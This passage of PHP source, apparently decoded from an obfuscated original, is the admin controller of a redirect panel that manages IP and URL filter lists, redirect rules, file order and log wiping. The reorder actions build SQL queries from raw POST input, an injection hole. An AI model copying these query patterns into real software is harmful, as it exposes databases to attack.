                    {
                        db::insert(array( "Type" => $type, "Title" => $title ), "IP");
                    }

                }

            }
            Threads::realsave();
        }

        break;
    case "addUrl":
        $url = _obfuscated_0D1A27275C5B1A0C391939052F053C0A372B11341B2B22_($_POST["value"]);
        if( strpos($url, "http://") === false ) 
        {
            $url = "http://" . $url;
        }

        $res = db::selectone("ID", "IP", "Title=\"" . $url . "\"");
        if( $url != "" && $url != "http://" && $res == null ) 
        {
            $id = db::insert(array( "Title" => $url, "Type" => 0 ), "IP");
            Threads::realsave();
            if( 30 < mb_strlen($url) ) 
            {
                $short = mb_substr($url, 0, 20) . "..." . mb_substr($url, 0 - 10);
            }
            else
            {
                $short = $url;
            }

            $imgPath = Config::get("AdminScriptName") . "?" . Config::get("MainParamName") . "=file&type=img&file=";
            if( $ajax ) 
            {
                echo "<li id=\"r" . $id . "\"><div class=\"div1\"><div class=\"div2\"><img src=\"" . $imgPath . "icons/world.png\" width=\"16px\" height=\"16px\" ALIGN=\"ABSMIDDLE\"/> <a title=\"" . $url . "\">" . $short . "</a></div><div class=\"trash\" onclick=\"Secur.del(" . $id . ")\"></div></div></li>";
            }

        }
        else
        {
            if( $ajax ) 
            {
                echo "false";
            }

        }

        if( !$ajax ) 
        {
            header("Location: " . $_SERVER["HTTP_REFERER"]);
        }

        db::close();
        exit();
    case "addIP":
        $url = _obfuscated_0D1A27275C5B1A0C391939052F053C0A372B11341B2B22_($_POST["value"]);
        $arr = explode(".", $url);
        $res = db::selectone("ID", "IP", "Title=\"" . $url . "\"");
        if( count($arr) == 4 && $url != "" && $res == null ) 
        {
            $id = db::insert(array( "Title" => $url, "Type" => 1 ), "IP");
            Threads::realsave();
            $imgPath = Config::get("AdminScriptName") . "?" . Config::get("MainParamName") . "=file&type=img&file=";
            if( $ajax ) 
            {
                echo "<li id=\"r" . $id . "\"><div class=\"div1\"><div class=\"div2\"><img src=\"" . $imgPath . "icons/ip.gif\" width=\"15px\" height=\"11px\" ALIGN=\"ABSMIDDLE\"/> " . $url . "</div><div class=\"trash\" onclick=\"Secur.del(" . $id . ")\"></div></div></li>";
            }

        }
        else
        {
            if( $ajax ) 
            {
                echo "false";
            }

        }

        if( !$ajax ) 
        {
            header("Location: " . $_SERVER["HTTP_REFERER"]);
        }

        db::close();
        exit();
    case "delIP":
        $id = ($ajax ? intval($_POST["id"]) : intval($_GET["id"]));
        db::deletebyid($id, "IP");
        if( !$ajax ) 
        {
            header("Location: " . $_SERVER["HTTP_REFERER"]);
        }

        Threads::realsave();
        db::close();
        exit();
    case "export":
        $list = db::select("select Type,Title from IP order by Title asc");
        header("Content-Disposition: attachment; filename=\"IP-URL-list.txt\"");
        foreach( $list as $l ) 
        {
            echo $l["Title"] . "\r\n";
        }
        db::close();
        exit();
    case "reorderFiles":
        $ruleID = intval($_POST["ruleID"]);
        $order = explode(",", $_POST["order"]);
        foreach( $order as $sort => $o ) 
        {
            db::query("update FilesInRules set Sort = " . $sort . " where (RuleID = " . $ruleID . ") and (FileID = " . $o . " )");
        }
        Threads::realsave();
        db::close();
        exit();
    case "reorderRedirects":
        $ruleID = intval($_POST["ruleID"]);
        $order = explode(",", $_POST["order"]);
        foreach( $order as $sort => $o ) 
        {
            db::query("update Redirects set Sort = " . $sort . " where (RuleID = " . $ruleID . ") and (ID = " . $o . " )");
        }
        Threads::realsave();
        db::close();
        exit();
    case "totalDelete":
        db::query("truncate table Logs");
        db::query("truncate table Referers");
        $redirects = db::select("select ID, FileLimit from Redirects");
        foreach( $redirects as $red ) 
        {
            $fName = Threads::findredirect($red["ID"]);
            $path = Config::get("FilesDir") . "/red" . $red["ID"] . "/";
            rename($path . $fName, $path . $red["FileLimit"]);
        }
        db::close();
        exit();
    case "threadDelete":
        $threadID = intval($_POST["threadID"]);
        $redirects = db::select("select ID, FileLimit from Redirects where RuleID in (select ID from Rules where ThreadID = " . $threadID . ")");
        foreach( $redirects as $red ) 
        {
            $fName = Threads::findredirect($red["ID"]);
            $path = Config::get("FilesDir") . "/red" . $red["ID"] . "/";
            rename($path . $fName, $path . $red["FileLimit"]);
        }
        db::query("update Logs set Deleted = 1 where ThreadID = " . $threadID);
        db::close();
        exit();
    case "index":
    default:
        $templateName = "index";
        break;
}
ob_start();
echo Template::show($templateName);
$res = ob_get_contents();
ob_clean();
$res = str_replace("\t", "", $res);
$res = str_replace("\r\n\r\n", "", $res);
$strs = explode("\r\n", $res);
$rStrs = array( "" );
$k = 0;
foreach( $strs as $s ) 
{
    if( strlen($rStrs[$k]) < 150 ) 
    {
        $rStrs[$k] .= $s;
    }
    else
    {
        $k++;
        $rStrs[$k] = $s;
    }

}
echo implode("\r\n", $rStrs);
db::close();

